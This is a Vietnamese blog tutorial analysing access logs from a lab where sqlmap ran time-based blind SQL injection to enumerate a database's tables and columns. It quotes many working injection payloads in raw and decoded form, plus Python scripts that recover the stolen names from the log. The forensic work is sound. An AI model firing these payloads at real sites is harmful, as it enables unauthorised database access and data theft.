### Giới thiệu

Phần trước mình trước mình cũng đã nói qua về [phân tích log SQL Injection](https://viblo.asia/p/phan-tich-log-sql-injection-part1-oOVlYMnBl8W) các bạn có thể tham khảo thêm hoặc đọc qua để dễ theo dõi hơn cho phần 2 này nhé. Ở bài viết trước mình đã phân tích đến đoạn attacker lấy được những tên databases có trên server, phần tiếp theo này mình sẽ phân tích tiếp những hành động mà attacker đã thực hiện. Một số thứ phần trước mình chưa đề cập tới nên có thể các bạn sẽ khó theo dõi vì vậy trong bài viết này mình sẽ bổ sung thêm một số chi tiết giúp các bạn dễ theo dõi hơn.

###  Phân tích

Như ở trên đã nói một số thứ mình đã không đề cập ở phần trước dẫn đến việc khó theo dõi nên trong phần này mình sẽ bổ sung thêm để các bạn tiện theo dõi hơn.

#### Tổng quan về file log

![](https://images.viblo.asia/3763c358-6d69-4bfd-822c-1609d379dac2.png)

Việc dễ dàng chia ra từng phần để phân tích bởi vì đây chỉ là một lab mình dựng lên để học cách phân tích nên chỉ có duy nhất request của attacker, trong thực tế thì một ứng dụng web nhiều người dùng trong một giây có thể có rất nhiều requests tới nên việc phân tích cũng khó khăn hơn. 

Nhưng về cơ bản thì chúng ta cũng vẫn có thể chia ra từng phần như vậy được bởi trước mỗi phần thực hiện lấy dữ liệu thì sqlmap đều gửi một vài request để kiểm tra có bị block hay không. 

Giống như hình bên trên chúng ta có thể thấy sqlmap đã gửi ~25 requests thường để kiểm tra việc block request trước khi thực hiện dump data.


#### Lấy tên các bảng
Ở phần một vừa rồi mình đã làm đến công đoạn lấy ra tên các databases, để tiếp nối phần trước thì phần này sẽ là lấy ra tên các bảng trong một database nào đấy mà attacker đã lựa chọn. Phần này tương tự như phần lấy ra tên các databases trên server, đầu tiên lấy ra số bảng của database mà attacker đã chọn

```log
42.112.114.236 - - [10/Aug/2020:08:30:26 +0000] "GET /webapp/search.php?id=123%20AND%20%28SELECT%206037%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28table_name%29%20AS%20NCHAR%29%2C0x20%29%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%3D0x776562617070%29%2C1%2C1%29%29%3E51%2C0%2C5%29%29%29%29%29BEVL%29 HTTP/1.1" 200 413 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
42.112.114.236 - - [10/Aug/2020:08:30:26 +0000] "GET /webapp/search.php?id=123%20AND%20%28SELECT%206037%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28table_name%29%20AS%20NCHAR%29%2C0x20%29%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%3D0x776562617070%29%2C1%2C1%29%29%3E48%2C0%2C5%29%29%29%29%29BEVL%29 HTTP/1.1" 200 414 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
42.112.114.236 - - [10/Aug/2020:08:30:34 +0000] "GET /webapp/search.php?id=123%20AND%20%28SELECT%206037%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28table_name%29%20AS%20NCHAR%29%2C0x20%29%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%3D0x776562617070%29%2C1%2C1%29%29%3E49%2C0%2C5%29%29%29%29%29BEVL%29 HTTP/1.1" 200 415 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
42.112.114.236 - - [10/Aug/2020:08:30:34 +0000] "GET /webapp/search.php?id=123%20AND%20%28SELECT%206037%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28table_name%29%20AS%20NCHAR%29%2C0x20%29%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%3D0x776562617070%29%2C1%2C1%29%29%21%3D49%2C0%2C5%29%29%29%29%29BEVL%29 HTTP/1.1" 200 417 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
42.112.114.236 - - [10/Aug/2020:08:30:34 +0000] "GET /webapp/search.php?id=123%20AND%20%28SELECT%206037%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28table_name%29%20AS%20NCHAR%29%2C0x20%29%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%3D0x776562617070%29%2C2%2C1%29%29%3E51%2C0%2C5%29%29%29%29%29BEVL%29 HTTP/1.1" 200 414 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
42.112.114.236 - - [10/Aug/2020:08:30:34 +0000] "GET /webapp/search.php?id=123%20AND%20%28SELECT%206037%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28table_name%29%20AS%20NCHAR%29%2C0x20%29%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%3D0x776562617070%29%2C2%2C1%29%29%3E48%2C0%2C5%29%29%29%29%29BEVL%29 HTTP/1.1" 200 414 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
42.112.114.236 - - [10/Aug/2020:08:30:34 +0000] "GET /webapp/search.php?id=123%20AND%20%28SELECT%206037%20FROM%20%28SELECT%28SLEEP%285-%28IF%28ORD%28MID%28%28SELECT%20IFNULL%28CAST%28COUNT%28table_name%29%20AS%20NCHAR%29%2C0x20%29%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%3D0x776562617070%29%2C2%2C1%29%29%3E9%2C0%2C5%29%29%29%29%29BEVL%29 HTTP/1.1" 200 414 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
```

decode URL:

```
42.112.114.236 - - [10/Aug/2020:08:30:26  0000] "GET /webapp/search.php?id=123 AND (SELECT 6037 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x776562617070),1,1))>51,0,5)))))BEVL) HTTP/1.1" 200 413 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
42.112.114.236 - - [10/Aug/2020:08:30:26  0000] "GET /webapp/search.php?id=123 AND (SELECT 6037 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x776562617070),1,1))>48,0,5)))))BEVL) HTTP/1.1" 200 414 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
42.112.114.236 - - [10/Aug/2020:08:30:34  0000] "GET /webapp/search.php?id=123 AND (SELECT 6037 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x776562617070),1,1))>49,0,5)))))BEVL) HTTP/1.1" 200 415 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
42.112.114.236 - - [10/Aug/2020:08:30:34  0000] "GET /webapp/search.php?id=123 AND (SELECT 6037 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x776562617070),1,1))!=49,0,5)))))BEVL) HTTP/1.1" 200 417 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
42.112.114.236 - - [10/Aug/2020:08:30:34  0000] "GET /webapp/search.php?id=123 AND (SELECT 6037 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x776562617070),2,1))>51,0,5)))))BEVL) HTTP/1.1" 200 414 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
42.112.114.236 - - [10/Aug/2020:08:30:34  0000] "GET /webapp/search.php?id=123 AND (SELECT 6037 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x776562617070),2,1))>48,0,5)))))BEVL) HTTP/1.1" 200 414 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
42.112.114.236 - - [10/Aug/2020:08:30:34  0000] "GET /webapp/search.php?id=123 AND (SELECT 6037 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x776562617070),2,1))>9,0,5)))))BEVL) HTTP/1.1" 200 414 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
```


Nhìn vào param `id` có thể thấy câu query khá là dài
```sql
id=123 AND (SELECT 6037 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x776562617070),1,1))>51,0,5)))))BEVL)
```

Phân tích từng phần của câu query như sau:

```sql
SELECT IFNULL(CAST(COUNT(table_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x776562617070
``` 
Đầu tiên attacker thực hiện lấy ra số tables trong database `0x776562617070(WHERE table_schema=0x776562617070)` tên database đã được encode dưới dạng hex, decode hex 0x776562617070 -> webapp như vậy là attacker đã nhắm vào database webapp trong số các databases mình đã phân tích ở phần trước



Phân còn lại của query là lấy từng ký tự của kết quả trên map sang bảng ascii sau đó so sánh với một giá trị để nhận biết kết quả này thì sqlmap sử dụng sleep trong query, nhưng mấu chốt là sqlmap lại confirm bằng một biểu thức so sánh `!=` nên nhìn vào 7 dòng log ở trên thì thấy có một dòng sử dụng so sánh `!=49`
```sql
42.112.114.236 - - [10/Aug/2020:08:30:34  0000] "GET /webapp/search.php?id=123 AND (SELECT 6037 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x776562617070),1,1))!=49,0,5)))))BEVL) HTTP/1.1" 200 417 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
```
Như vậy là request này để xác nhận trong database webapp chỉ có một bảng.


Phân tiếp theo là phần lấy ra tên của bảng đó:
![](https://images.viblo.asia/53a7b030-6a38-4813-b8d0-f1417c5c79b8.png)

Tương tự như phần lấy ra số bảng chỉ khác trong query đã bỏ COUNT đi nên việc phân tích giống hệt như trên, vì có một bảng nên mình đã code một đoạn script đơn giản để lấy ra tên bảng như sau:

```python
import re

lines = open('tables.log').read().splitlines()

table_name = ""
for line in lines:
    result = re.findall(r'%21%3D[0-9]{2,3}', line)
    if result:
        table_name += chr(int(result[0][6::]))
    
print(table_name)
```

![](https://images.viblo.asia/2d5b2eb6-d5b2-4faa-a482-89c558331819.png)

Sau khi chạy đoạn script lấy được tên bảng là users, phần tiếp theo chắc attacker sẽ lấy tiếp dữ liệu trong bảng này, nhưng đến đây việc phân tích trở nên đơn giản hơn rất nhiều rồi. Vì những câu query cho đến thời điểm hiện tại khá là giống nhau.


Format lần này giống hệt như những lần trước, đầu tiên sẽ lấy ra số cột trong bảng mà attacker đã chọn

```
103.37.29.230 - - [10/Aug/2020:08:31:46  0000] "GET /webapp/search.php?id=123 AND (SELECT 5051 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x776562617070),1,1))>51,0,5)))))JGbP) HTTP/1.1" 200 431 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
103.37.29.230 - - [10/Aug/2020:08:31:47  0000] "GET /webapp/search.php?id=123 AND (SELECT 5051 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x776562617070),1,1))>48,0,5)))))JGbP) HTTP/1.1" 200 431 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
103.37.29.230 - - [10/Aug/2020:08:32:02  0000] "GET /webapp/search.php?id=123 AND (SELECT 5051 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x776562617070),1,1))>49,0,5)))))JGbP) HTTP/1.1" 200 432 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
103.37.29.230 - - [10/Aug/2020:08:32:07  0000] "GET /webapp/search.php?id=123 AND (SELECT 5051 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x776562617070),1,1))>50,0,5)))))JGbP) HTTP/1.1" 200 431 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
103.37.29.230 - - [10/Aug/2020:08:32:13  0000] "GET /webapp/search.php?id=123 AND (SELECT 5051 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x776562617070),1,1))!=51,0,2)))))JGbP) HTTP/1.1" 200 432 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
103.37.29.230 - - [10/Aug/2020:08:32:13  0000] "GET /webapp/search.php?id=123 AND (SELECT 5051 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x776562617070),2,1))>51,0,2)))))JGbP) HTTP/1.1" 200 430 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
103.37.29.230 - - [10/Aug/2020:08:32:13  0000] "GET /webapp/search.php?id=123 AND (SELECT 5051 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x776562617070),2,1))>48,0,2)))))JGbP) HTTP/1.1" 200 431 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
103.37.29.230 - - [10/Aug/2020:08:32:13  0000] "GET /webapp/search.php?id=123 AND (SELECT 5051 FROM (SELECT(SLEEP(2-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x776562617070),2,1))>9,0,2)))))JGbP) HTTP/1.1" 200 431 "-" "sqlmap/1.4.7#stable (http://sqlmap.org)"
```

Phần này phân tích tay cũng được vì nó không quá dài nhìn vào đống log được decode url thì thấy có một query có biểu thức so sánh là `!=51` giống hệt những phần trước thì chúng ta có thể suy ra là  bảng users của database webapp (WHERE table_name=0x7573657273 AND table_schema=0x776562617070) có 3 cột.

Để lấy được tên các cột các bạn làm tương tự như lấy ra tên các databases, phần này mình thường dùng regex để match chuỗi có biểu thức so sánh `!=` và `LIMIT` để biết kết thúc tên của một cột
 
```python
import re

lines = open('column.log').read().splitlines()

column_name = ""
idx = 0
for line in lines:
    result = re.findall(r'LIMIT%20[0-9]{1,2}%2C[0-9]{1,2}%29%2C[0-9]{1,2}%2C1%29%29%21%3D[0-9]{2,3}', line)
    if result:
        char = result[0][36::]
        old_idx = int(result[0][8:9])
        if old_idx - idx > 0:
            column_name +=" "
            idx = old_idx
        column_name += chr(int(char))

print(column_name.split(" "))
```

![](https://images.viblo.asia/04c3f0c0-8605-41a1-b991-a6ecae766185.png)

### Kết luận

Đây là phần phân tích log dựa vào cả code và thủ công đôi khi còn nhiều hạn chế và nhiều khi kết quả không được chính xác hoàn toàn. Nhưng cũng là một bước tiếp cận cho việc phân tích log đạt được hiệu suất cao. Để tối ưu hơn với những hệ thống lớn cần có những kỹ năng cao hơn và những công cụ hỗ trợ mạnh hơn để đạt được kết quả tốt nhất có thể.